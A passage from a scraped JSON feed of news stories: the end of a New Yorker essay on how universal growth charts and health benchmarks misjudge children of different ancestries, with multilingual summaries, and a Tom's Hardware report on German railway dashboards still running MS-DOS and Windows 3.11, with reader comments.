fact that, at every age, the average height of children at each site was within half a standard deviation of the over-all average. But by that reasoning, as the Indian pediatrician Harshpal Singh Sachdev recently observed in The American Journal of Clinical Nutrition, two sites could differ by as much as a standard deviation and still be considered equivalent. That’s like saying that the mean adult heights in Denmark and Taiwan exhibit “striking similarity” despite differing by more than six centimetres. Among low-income families in urban India, Sachdev noted, ambitious interventions targeting health, sanitation, nutrition, and psychosocial support have failed to increase stature by half a standard deviation, suggesting that differences among sites may reflect disparate physiological baselines.Beyond height, no cross-site comparisons have ever been published for other measurements, including weight-for-height and weight-for-age metrics and head circumference. Nevertheless, these metrics are regularly used for clinical and cross-national purposes, and treated as if they were universally applicable. When the W.H.O. reports that nearly one in six African children is underweight—or when the Global Nutrition Report states that 45.4 million children under the age of five are wasted—public-health policies are guided by untested assumptions.My wife and I didn’t know any of this when our daughter was first flagged for being underweight. But we had suspicions that her size might not have been as atypical as the charts implied. My wife’s family, like mine, emigrated from India. Asking around, we learned that many parents of South Asian ancestry had exceptionally small children. On Reddit forums such as r/india and r/ABCDesis, we discovered parents worrying about the same issue. Two of my wife’s cousins had been born smaller than our daughter.It turned out that credible research corroborated our suspicions. A series of Stanford-led studies had analyzed millions of births in the U.S. and documented a “dual paradox”: U.S.-born women of Mexican parentage, despite having higher risk profiles than U.S.-born women of Indian ancestry, are less likely to have babies with low birth weights. That’s one of many inconsistencies pertaining to size and nutrition. Take the so-called South Asian Enigma: India, Bangladesh, and Nepal exceed most sub-Saharan African countries on key health and development indicators, but their populations still fail to measure up (literally) to those in sub-Saharan Africa or the African diaspora. For instance, Haiti’s infant-mortality rate is almost twice that of India’s, and its per-capita G.D.P. is thirty per cent lower, yet only six per cent of Haitian children are assessed as severely stunted, compared with fourteen per cent of Indian children. You find similar disparities between affluent nations in East Asia and those in northern Europe. Japan and the Netherlands are among the wealthiest countries in the world, with first-rate health care and low disease burdens, but some seven per cent of Japanese children qualify as stunted, compared with only about one per cent in the Netherlands.The obvious takeaway is that factors aside from living standards—including biological inheritance—are the reason that Dutch and Haitian kids tower over their Japanese and Nepali peers. Yet many researchers have been wary of considering the possibility. In their efforts to resolve the South Asian Enigma, for example, they have busily investigated the effects of open-air defecation, maternal nutrition, and a preference for firstborn sons on the subcontinent. A team of economists examined whether the number of low-weight infants in sub-Saharan Africa who die skews height statistics.According to Daniel Hruschka, an anthropologist at Arizona State University, none of these theories explain away the discrepancies. Hruschka has long had a personal interest in body measurements. “I consider myself pretty healthy, but if you use B.M.I. guidelines I am obese, and I’ve always wondered, What does that mean for my health?” he told me. The question inspired him to spend more than a decade dissecting anthropometric data, resulting in a slew of revealing findings. In research published in the twenty-tens, he confirmed that a single B.M.I. cutoff for distinguishing normal from obese body weight overestimates obesity, as defined by body fat, in populations with stockier bodies (Pacific Islanders, say) and underestimates it in leaner peoples (South Asians). What’s more, patterns in slenderness, such as similarities between closely related groups and between children and adults in the same group, strongly suggest that genetics plays a major role. In 2016, Hruschka and the anthropologist Craig Hadley, at Emory University, estimated that the standard B.M.I. cutoff misses roughly half a billion overweight people, including some two hundred and fifty million in South Asia alone.After studying obesity, Hruschka turned his attention to height. In one of his most ambitious projects, published in 2020, he and his former student Joseph Hackman, now at the University of Utah, analyzed measurements from 1.5 million children across seventy countries. Using data on wealth, hygiene, nutrition, and infectious-disease exposure, they calculated each country’s “basal” height-for-age index—the starting height of children living under comparable environmental conditions. If the W.H.O. had been right to assume that children’s potential height is the same everywhere, basal height-for-age measurements should be consistent across populations.<img alt=\"Drummer leading medieval soldiers into battle.\" class=\"ResponsiveImageContainer-eybHBd fptoWY responsive-image__image\" src=\"https://media.newyorker.com/cartoons/67d9cb0f38fb0d49d0f9dfb4/master/w_1600%2Cc_limit/a26178.jpg\" srcSet=\"https://media.newyorker.com/cartoons/67d9cb0f38fb0d49d0f9dfb4/master/w_120,c_limit/a26178.jpg 120w, https://media.newyorker.com/cartoons/67d9cb0f38fb0d49d0f9dfb4/master/w_240,c_limit/a26178.jpg 240w, https://media.newyorker.com/cartoons/67d9cb0f38fb0d49d0f9dfb4/master/w_320,c_limit/a26178.jpg 320w, https://media.newyorker.com/cartoons/67d9cb0f38fb0d49d0f9dfb4/master/w_640,c_limit/a26178.jpg 640w, https://media.newyorker.com/cartoons/67d9cb0f38fb0d49d0f9dfb4/master/w_960,c_limit/a26178.jpg 960w, https://media.newyorker.com/cartoons/67d9cb0f38fb0d49d0f9dfb4/master/w_1280,c_limit/a26178.jpg 1280w, https://media.newyorker.com/cartoons/67d9cb0f38fb0d49d0f9dfb4/master/w_1600,c_limit/a26178.jpg 1600w\" sizes=\"100vw\"/>“Hey, I can’t murder people to jazz triplets.”Cartoon by Will McPhailCopy link to cartoonCopy link to cartoonLink copiedShopShopThey weren’t. For instance, the basal heights of children in India differed by more than a standard deviation from those of children in Haiti. Even when reared in identical environments, an Indian two-year-old would be expected to be three centimetres shorter than a Haitian two-year-old. When Hruschka and Hackman recalculated rates of severe stunting based on these findings, the estimated prevalence in Haiti more than tripled, from six per cent to twenty per cent. Similarly dramatic increases were observed in West and Central Africa. The reliance on growth charts, it seems, has hidden millions of severe stunting cases in parts of Africa.These calculations raise another troubling possibility: estimates of stunting in other regions might be exaggerated, leading to ill-advised nutritional interventions. A 2021 study by Sachdev found that more than half of Indian children aged five to nineteen classified as “malnourished” by W.H.O. standards actually show biomarkers of obesity. “Metabolically, they are even overnourished,” Sachdev told me. Where pediatricians would normally recommend cutting back on high-calorie food for such children, “here we are pushing it,” he said.This blindness to human variation affects children in wealthy countries, too. Though the W.H.O. charts are meant to spot “abnormal growth,” they regularly miss growth disorders in European children. It can’t help that the charts for five- to nineteen-year-olds still draw on decades-old data from the United States. In the Netherlands and Sweden, the W.H.O. charts catch only about seventy per cent of children over the age of five with growth-hormone deficiency; country-specific charts spot around ninety-five per cent. In a 2016 study of nine European nations, the W.H.O. standards consistently failed to outperform local references—except in France, which hadn’t updated its growth charts since1979.So charts meant to protect children’s health may be failing them across the globe, missing growth disorders in tall populations while pathologizing normal development in shorter ones. Parents in Mumbai, Manila, and Minneapolis alike must navigate a medical system built on standards that don’t reflect their children’s physiological realities. Some children who need care may be overlooked; others are subjected to unnecessary and potentially harmful interventions.“Our differences are obvious, even on the surface,” Pontzer observes in “Adaptable.” “Why should our insides be any less diverse?” It’s a reasonable question. We regularly confront the fact that different environments have the power to change us. We know that people who train at high altitudes develop greater aerobic capacity and that populations long exposed to more UV radiation develop darker skin. Pontzer catalogues a great many such examples, from East African hunter-gatherers whose life styles shield them from cardiovascular disease to Southeast Asian sea nomads with genetic adaptations that let them spend hours a day underwater. Yet international organizations continue to operate on the assumption of a universal human physiology—one that, in practice, corresponds strikingly with a Euro-American model.Take anemia, a condition in which the blood’s ability to carry oxygen is diminished. The W.H.O. first proposed diagnostic cutoffs in a 1959 report. These measures of hemoglobin concentration, a subsequent scientific group admitted, “were chosen arbitrarily,” so new thresholds were introduced after the group reviewed five studies—on American infants, pregnant Canadian women, Norwegian adolescent males, British adults in a mining valley, and, apparently, Swedes. (There’s some uncertainty because the final set of observations was not released.) The revised cutoffs, presented in 1968, were still “somewhat arbitrary,” the authors conceded, but lines had to be drawn. More than fifty years later, these remain the W.H.O.’s guidelines, with only slight modifications for children and pregnant women. A 2023 paper in The Lancet Haematology that announced that nearly two billion people were anemic relied on versions of the 1968 cutoffs.Untold other benchmarks have similar stories. Criteria for zinc deficiency, as defined by the International Zinc Nutrition Consultative Group, are based on data collected in the United States between 1976 and 1980. Bear that in mind when you hear claims that more than a billion people are zinc-deficient. The threshold for Vitamin D deficiency is also based mostly on research involving Europeans and North Americans, leading to the claim that ninety per cent of Indians lack sufficient Vitamin D, despite the subcontinent’s abundant sunlight.Why insist on a universal standard? In part, it has been a matter of practicality. For decades, establishing population-specific benchmarks required extensive data collection, statistical modelling, and clinical validation—efforts too costly for most countries to undertake. International organizations like the W.H.O. provided usable, if imperfect, alternatives. But these constraints are disappearing. With vast survey data sets and advanced analytical tools, studies such as those by Hruschka and Hackman reveal population-level patterns that can inform more tailored benchmarks. Meanwhile, scientists in low- and middle-income countries are testing whether inherited global cutoffs line up with local realities. As the barriers to measuring human variation fall, so does the rationale for a one-size-fits-all model.Even with these advances, Pontzer suspects another reason for the reluctance to discuss biological variation: “Differences are dangerous.” Throughout history, claims of inherent disparities have fuelled oppression, from the justification of slavery to the forced sterilization of the poor. Well-intentioned efforts to account for variation have sometimes harmed marginalized groups. Beginning in 1999, a standard equation for measuring kidney function included a “race coefficient,” which systematically overestimated kidney health in Black patients. As a result, many Black people were referred to specialists belatedly or deemed ineligible for treatments like kidney transplants. In 2021, when the National Kidney Foundation and the American Society of Nephrology recommended removing race from these calculations, more than a million Black Americans were immediately reclassified into more severe stages of kidney disease.The failures of race-based medicine aren’t an argument for ignoring physiological diversity. Pretending that differences don’t exist doesn’t make them disappear; it only drives practitioners to rely on flawed intuitions. Familiar racial categories do a poor job of tracking ancestry and genetic variation. Yoruba people, in Nigeria, and Bench people, in Ethiopia, both qualify as Black, yet genetically they are further apart than an English person is from a Tamil. Instead of clinging to dubious classifications that obscure variation, we would be better served by developing methods that account for people’s distinctive ancestry and lived environment.In January, we celebrated our daughter’s first birthday. For reasons of happenstance, we were seeing a new pediatrician for her twelve-month visit. We felt confident. We had ramped up feeding efforts, watching with satisfaction as our daughter’s thighs plumped and her round belly spilled over the waistband of her diaper. Admittedly, every previous visit to the pediatrician’s office had begun with the same sense of achievement—only to be deflated by troubling percentiles. But this time she looked particularly pudgy.“Seventeen,” my wife whispered, stealing my guess.“Sixteen pounds, seven ounces,” the nurse read, squinting at the scale. Not bad, I thought.When the pediatrician entered, he handed us printouts of familiar curves, each marked with a dot representing our daughter: sixth percentile for both weight-for-age and weight-for-height. He asked how these numbers compared with her previous measurements. As we answered him, he stared at the charts, seemingly wrestling with the severity of the situation. Then he said that he was referring us to a dietitian.Despite ordering a weight check in six weeks and several blood tests, though, he didn’t appear to be visibly troubled. It was as if he, like us, saw two versions of our daughter—the one sitting before him, gleeful and energetic, and the other on the chart, abstractly a cause for concern. Not knowing which to trust, he deferred the verdict to someone else.Such uncertainty is inherent to medical inference. A heavy baby might just be big-boned; a small one, slim but robust. Yet the reliance on universal benchmarks has widened the disconnect between bodies and their measurements. Resistant to acknowledging population differences, these standards often flag healthy bodies as worrisome and look past malnourished ones. As a result, hundreds of millions of people—often in the poorest countries—are mislabelled, while tools like the W.H.O.’s growth standards, stretched to fit all of humanity, prove less effective than local alternatives. Paradoxically, these efforts sometimes undermine their own goals, concealing, and at times exacerbating, the afflictions of the most vulnerable.In mid-February, we met virtually with the dietitian. She asked about our feeding routine—which foods, when, how much breast-feeding—and watched as our daughter clambered from my wife’s lap onto the table, reaching for the computer. The dietitian didn’t refer us to another specialist or dwell on percentiles. Instead, she assured us that our daughter was O.K. Petite, yes, but “holding her own.” Besides, she confirmed, many Indian children tend to be smaller. Still, she advised us to keep feeding her well and often, to add butter and the like whenever we could, to stay vigilant.Maybe in a decade, the one-size-fits-all curves will give way to standards that recognize the different shapes of different populations, and the advice will shift to match. But, for now, we live in the space between two realities—the numbers on a spreadsheet and the child in our arms.♦",
    "summary": {
      "en": "The article discusses the limitations of universal health benchmarks in assessing child growth and nutrition, highlighting the need for more individualized standards that account for human diversity. \n\nKey points include:\n\n1. **Universal Health Standards**: Current health metrics, like growth charts, assume a one-size-fits-all model for defining malnutrition and growth abnormalities, ignoring the diversity in human biology and environmental adaptation.\n\n2. **Personal Experience**: The author shares their experience with their daughter, who was classified as \"wasted\" despite being healthy and active, illustrating the disconnect between clinical assessments and individual health.\n\n3. **Global Health Data Issues**: Studies indicate that global health metrics often rely on data from specific populations (mainly Western) and can misrepresent the health of diverse groups, leading to inappropriate health interventions.\n\n4. **The South Asian Enigma**: Research shows that populations from South Asia often appear smaller in standard health metrics but may not be unhealthy, contradicting the assumptions made by universal standards.\n\n5. **Call for Change**: The article advocates for developing health metrics that reflect local populations and conditions instead of imposing universal standards that may mislabel healthy individuals as malnourished.\n\n6. **Conclusion**: The reliance on outdated and broad health benchmarks can lead to misdiagnoses and ineffective public health policies. A shift towards acknowledging individual and population differences in health assessments is essential for better health outcomes.",
      "ko": "이 기사는 아동 성장과 영양을 평가하는 데 있어 보편적인 건강 기준의 한계를 다루고 있으며, 인간의 다양성을 반영한 보다 개인화된 기준의 필요성을 강조합니다.\n\n현재의 건강 지표, 예를 들어 성장 차트는 영양 부족과 성장 이상을 정의할 때 모든 사람에게 동일하게 적용되는 모델을 가정하고 있습니다. 이는 인간 생물학의 다양성과 환경 적응을 무시하는 것입니다. \n\n저자는 자신의 딸에 대한 경험을 공유하며, 딸이 건강하고 활동적임에도 불구하고 \"영양실조\"로 분류된 사례를 통해 임상 평가와 개인 건강 간의 괴리를 보여줍니다. \n\n연구에 따르면, 전 세계 건강 지표는 주로 특정 인구(주로 서구 국가)의 데이터를 기반으로 하며, 다양한 집단의 건강을 잘못 표현할 수 있어 부적절한 건강 개입으로 이어질 수 있습니다. \n\n남아시아 인구는 표준 건강 지표에서 종종 더 작게 나타나지만, 이는 반드시 건강하지 않다는 것을 의미하지 않으며, 보편적인 기준이 가진 가정과 모순됩니다. \n\n이 기사는 건강 지표가 지역 인구와 조건을 반영하도록 개발되어야 한다고 주장합니다. 보편적인 기준을 강요하는 대신, 건강한 개인이 영양 부족으로 잘못 분류되는 것을 방지해야 합니다. \n\n구식의 광범위한 건강 기준에 의존하는 것은 잘못된 진단과 비효율적인 공공 건강 정책으로 이어질 수 있습니다. 건강 평가에서 개인과 집단의 차이를 인정하는 방향으로의 전환이 더 나은 건강 결과를 위해 필수적입니다.",
      "ja": "この記事では、子どもの成長や栄養を評価する際の普遍的な健康基準の限界について述べており、人間の多様性を考慮したより個別化された基準の必要性が強調されています。\n\n現在の健康指標、例えば成長曲線は、栄養失調や成長異常を定義する際に一律のモデルを前提としており、人間の生物学的多様性や環境への適応を無視しています。著者は、自身の娘が健康で活動的であるにもかかわらず「やせ型」と分類された経験を共有し、臨床評価と個々の健康との間にあるギャップを示しています。\n\n研究によると、世界の健康指標は特定の集団（主に西洋）からのデータに依存していることが多く、多様なグループの健康を誤って表現することがあります。これにより、不適切な健康介入が行われる可能性があります。南アジアの人々は、標準的な健康指標では小柄に見えることが多いですが、必ずしも不健康であるわけではないという研究結果もあり、普遍的な基準の前提に矛盾しています。\n\nこの記事は、地域の人口や条件を反映した健康指標の開発を求めており、健康な個人を栄養失調と誤ってラベリングするような普遍的基準を押し付けるのではなく、個別のニーズに応じた評価が必要であると訴えています。古い広範な健康基準に依存することは、誤診や効果的でない公衆衛生政策を招く可能性があります。健康評価において個人や集団の違いを認識することが、より良い健康結果を得るためには不可欠です。"
    }
  },
  {
    "id": "783456a1fffac035",
    "title": {
      "en": "MS-DOS and Windows 3.11 still run train dashboards at German railway (Jan'24)",
      "ko": "독일 기차, MS-DOS로 운행!",
      "ja": "ドイツ鉄道のレトロ技術"
    },
    "type": "story",
    "url": "https://www.tomshardware.com/software/windows/ms-dos-and-windows-311-still-run-train-dashboards-at-german-railway-company-listed-admin-job-for-30-year-old-operating-system",
    "score": 23,
    "by": "wojtczyk",
    "time": 1743294115,
    "content": "Software\n\nOperating Systems\n\nWindows\n\nMS-DOS and Windows 3.11 still run train dashboards at German railway — company listed admin job for 30-year-old operating system\n\nNews\n\nBy\nMark Tyson\n\npublished\nJanuary 29, 2024\n\nMany with the requisite experience might already have retired.\n\nComments (41)\n\nWhen you purchase through links on our site, we may earn an affiliate commission. Here’s how it works.\n\nwindow.vanilla.infiniteArticlesData = [];\n\n(Image credit: Microsoft / Archive.org)\n\nA German railway firm posted a vacancy for a Windows 3.11 Administrator just before the weekend. In addition to skills in wrangling Windows for Workgroups on the 30-year-old operating system, the recruiter would look upon a candidate more fondly for possessing MS-DOS experience. The admin would purportedly oversee systems with 166MHz processors and a whopping 8MB of RAM. It might seem slightly worrying that modern railways are still running on such ancient systems, but mission-critical systems often adhere to the \"if it ain't broke, don't fix it\" philosophy.Silicon lover Konkretor highlighted the above vacancy on Twitter / X and explained that the hiring company was responsible for \"railway display boards for almost all of Germany.\" These systems obviously rely in some part on old MS-DOS and Windows 3.11 applications.The job listing, which we saw yesterday, seems to have been taken down today. It mentions that the appointee will maintain and update the old systems that are still pivotal to railway operations. In further detail, we learn that this software is responsible for \"the driver's cab display system on high-speed and regional trains [which] shows the driver the most important technical data in real-time.\"Latest Videos From Tom's HardwareTom's Hardware(Image credit: Future)Seeing such old legacy OSes being relied upon for delivering important real-time data is somewhat worrying, but it isn't uncommon to find old mission-critical systems run by old software. Additionally, the display might only provide data for information, not critical safety systems.Windows 3.1X was notable for being the first version of Microsoft’s GUI-based operating system with integrated networking and introduced a 386-protected mode networking stack. Microsoft launched this network-friendly OS back in 1992 and ended support for it on December 31, 2001. Did the German rail company miss the memo?According to some chit-chat on the Hacker News forum, the above-mentioned legacy system is currently in use on Germany’s ICE 1 and ICE 2 trains. If true, the software that's reliant on MS-DOS and Win 3.11 might be required until 2030 or later. Another interesting titbit was the assertion that one of the railway systems running Win 3.11 has a BIOS dating from 1996 and features a 166MHz processor plus 8MB of RAM.Ancient hardware and software keep turning up in the most unexpected places. Only yesterday, we reported on Japan’s mandarins finally being weaned off their addiction to floppy disks. Meanwhile, enthusiasts still purchase computers based around Intel’s ancient 8088 CPU and dabble in overclocking ISA bus graphics cards.\n    window.sliceComponents = window.sliceComponents || {};\n\n    externalsScriptLoaded.then(() => {\n        window.reliablePageLoad.then(() => {\n            var componentContainer = document.querySelector(\"#slice-container-newsletterForm-articleInbodyContent-6EUoMxv6HkgrQXtdpZFVQj\");\n\n            if (componentContainer) {\n                var data = {\"layout\":\"inbodyContent\",\"header\":\"Stay On the Cutting Edge: Get the Tom's Hardware Newsletter\",\"tagline\":\"Get Tom's Hardware's best news and in-depth reviews, straight to your inbox.\",\"formFooterText\":\"By submitting your information you agree to the <a href=\\\"https:\\/\\/futureplc.com\\/terms-conditions\\/\\\" target=\\\"_blank\\\">Terms & Conditions<\\/a> and <a href=\\\"https:\\/\\/futureplc.com\\/privacy-policy\\/\\\" target=\\\"_blank\\\">Privacy Policy<\\/a> and are aged 16 or over.\",\"successMessage\":{\"body\":\"Thank you for signing up. You will receive a confirmation email shortly.\"},\"failureMessage\":\"There was a problem. Please refresh the page and try again.\",\"method\":\"POST\",\"inputs\":[{\"type\":\"hidden\",\"name\":\"NAME\"},{\"type\":\"email\",\"name\":\"MAIL\",\"placeholder\":\"Your Email Address\",\"required\":true},{\"type\":\"hidden\",\"name\":\"NEWSLETTER_CODE\",\"value\":\"XTH-X\"},{\"type\":\"hidden\",\"name\":\"LANG\",\"value\":\"EN\"},{\"type\":\"hidden\",\"name\":\"SOURCE\",\"value\":\"60\"},{\"type\":\"hidden\",\"name\":\"COUNTRY\"},{\"type\":\"checkbox\",\"name\":\"CONTACT_OTHER_BRANDS\",\"label\":{\"text\":\"Contact me with news and offers from other Future brands\"}},{\"type\":\"checkbox\",\"name\":\"CONTACT_PARTNERS\",\"label\":{\"text\":\"Receive email from us on behalf of our trusted partners or sponsors\"}},{\"type\":\"submit\",\"value\":\"Sign me up\",\"required\":true}],\"endpoint\":\"https:\\/\\/newsletter-subscribe.futureplc.com\\/v2\\/submission\\/submit\",\"analytics\":[{\"analyticsType\":\"widgetViewed\"}],\"ariaLabels\":{}};\n\n                var triggerHydrate = function() {\n                    window.sliceComponents.newsletterForm.hydrate(data, componentContainer);\n                }\n\n                if (window.lazyObserveElement) {\n                    window.lazyObserveElement(componentContainer, triggerHydrate);\n                } else {\n                    triggerHydrate();\n                }\n            }\n        }).catch(err => console.error('%c FTE ','background: #9306F9; color: #ffffff','Hydration Script has failed for newsletterForm-articleInbodyContent-6EUoMxv6HkgrQXtdpZFVQj Slice', err));\n    }).catch(err => console.error('%c FTE ','background: #9306F9; color: #ffffff','Externals script failed to load', err));\nStay On the Cutting Edge: Get the Tom's Hardware NewsletterGet Tom's Hardware's best news and in-depth reviews, straight to your inbox.Contact me with news and offers from other Future brandsReceive email from us on behalf of our trusted partners or sponsorsBy submitting your information you agree to the Terms & Conditions and Privacy Policy and are aged 16 or over.\n\nSee all comments (41)\n\nMark TysonSocial Links NavigationNews EditorMark Tyson is a news editor at Tom's Hardware. He enjoys covering the full breadth of PC tech; from business and semiconductor design to products approaching the edge of reason.\n\nLatest in Windows\n\nNew Windows file system option supports up to 35 petabyte volumes — ReFS appears in latest Insider build\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nHow to Zoom in and Out in Windows 11 or 10\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nWindows 11 Insider builds offer FAQs based on your PC's specs\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nHow to Restart Windows Explorer in Windows 11\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nMicrosoft updates Windows 11 CPU support for OEM systems to include 8th to 10th Gen Intel CPUs\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nWindows 11 Task Manager update will show accurate CPU utilization, align with industry standards\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nLatest in News\n\nIntel and SK hynix close NAND business deal: Intel gets $1.9 billion, SK hynix gets IP and employees\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nZotac RTX 5090 GPUs with missing ROPs sold at premium price by German retailer\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nTaiwanese authorities accuse SMIC and allies of poaching engineers\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\n$3,700 RTX 5090 GPUs have found new homes after sitting on US retailer's shelves\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nNvidia's 50-series laptop launch looks bumpy: slipping ship dates, game crashes, and delayed review units\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nIntel's board gets industry-focused as three directors will not seek re-election — badly needed shift to deeper tech experience\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nMore about windows\n\nNew Windows file system option supports up to 35 petabyte volumes — ReFS appears in latest Insider build\n\nHow to Zoom in and Out in Windows 11 or 10\n\nLatest\n\nBest Graphics Cards for Gaming in 2025\n\nSee more latest\n\n41 Comments\n\nComment from the forums\n\nwarezme\n\nI used to like MS-DOS and WIndows 3.11. This is quick OS on a 166 to 200Mhz CPU. It's probably a simple program designed to display data from some serial or RS232 connected sensors on the train. Quick efficient and simple. As cheap as all that is it would be simple to make is super redundant and shock and weather proof. Nothing wrong with any of that. You don't need a super CPU with tons of memory to do any of that unless you are redesigning the whole train with new displays and camera monitoring.\n\nReply\n\nOpcod\n\nOh interesting.. So having a stable system means ... stable. And now they push update every 5 min and other update to fix what is broken.. Moving forward is not always the best.\n\nReply\n\nCOLGeek\n\nI would imagine this is a very closed, tightly controlled environment, with minimal external risk. Assuming that is true, I don't see an issue here for the purpose being met.\n\nDefinitely a novel thing to read about.\n\nReply\n\nDr3ams\n\nI live in Germany and could admin Windows 3.11 and DOS. But I'm happily retired. :cool:\n\nI do have Windows 3.11 and Dos 6.22 installed in a virtual machine though...just to tinker with.\n\nReply\n\nekio\n\nDeutsch qualitat…\n\nReply\n\nBlastomonas\n\nSimple and reliable. The more complexity introduced, the more unreliable things seem to become.\n\nReply\n\nJeffreyP55\n\nAdmin said:A German railway firm posted a vacancy for a Windows 3.11 Administrator just ahead of the weekend. In addition to possessing skills in wrangling Windows for Workgroups, the recruiter wants a candidate with MS-DOS experience.\n\nMS-DOS and Windows 3.11 still run train dashboards at German railway — company listed admin job for 30-year-old operating system : Read moreOooo, with 32bit extensions! That was a weird modification.\n\nReply\n\nbigdragon\n\nSimple, understood, and reliable -- why wouldn't you use an old OS or custom OS to manage a train system? As long as the control interface isn't on the internet there shouldn't be a problem. Modern OS implementations have a penchant for interrupting, suggesting distractions, or buried bugs.\n\nReply\n\nDarkoverlordofdata\n\nLegacy hardware means legacy software - often custom. It probably costs more than their budget to replace it with modern railyard software.\n\nReply\n\nMrcreosote\n\nMaybe 10 years ago, I fired up a 3.11 PC and the damn thing was FAST. Booted much quicker than my XP and later stuff. Worked well, but my NEC CPM Z80A PC worked like a sewing machine.\n\nReply\n\nView All 41 Comments\n\nShow more comments\n\nMost Popular\n\nZotac RTX 5090 GPUs with missing ROPs sold at premium price by German retailer\n\nIntel and SK hynix close NAND business deal: Intel gets $1.9 billion, SK hynix gets IP and employees\n\nTaiwanese authorities accuse SMIC and allies of poaching engineers\n\nNvidia's 50-series laptop launch looks bumpy: slipping ship dates, game crashes, and delayed review units\n\n$3,700 RTX 5090 GPUs have found new homes after sitting on US retailer's shelves\n\nIntel's board gets industry-focused as three directors will not seek re-election — badly needed shift to deeper tech experience\n\nChina's AI data center boom goes bust: Rush leaves billions of dollars in idle infrastructure\n\nTSMC to reportedly speed up fab building in the US, third fab to begin construction this year\n\nEx-Intel CEO Gelsinger warns TSMC's $165B investment will not restore U.S. semiconductor leadership\n\nMicrosoft updates the Windows Game Bar to be more user friendly with PC Handhelds\n\nif(FUTR && FUTR.Connect){\n//Init Connect article History\nclass userNav {\nconstructor(key = 'connect_articles_history') {\nthis.key = key;\nthis.flushKey = `${key}_flush`;\nthis.propsKey = `${key}_props`;\nthis.store();\nconsole.info(\"FUTR.Connect.userNav - Init - Start - Using reduxStore\");\n}\nstore() {\nconst isArticle = window?.reduxStore?.getState()?.vanilla?.isArticle;\nif (typeof isArticle !== 'undefined' && isArticle && FUTR && FUTR.Connect) {\ntry {\nconst month = `${new Date().getFullYear()}-${new Date().getMonth()}`;\n//flush monthly\nif (localStorage.getItem(this.flushKey) !== 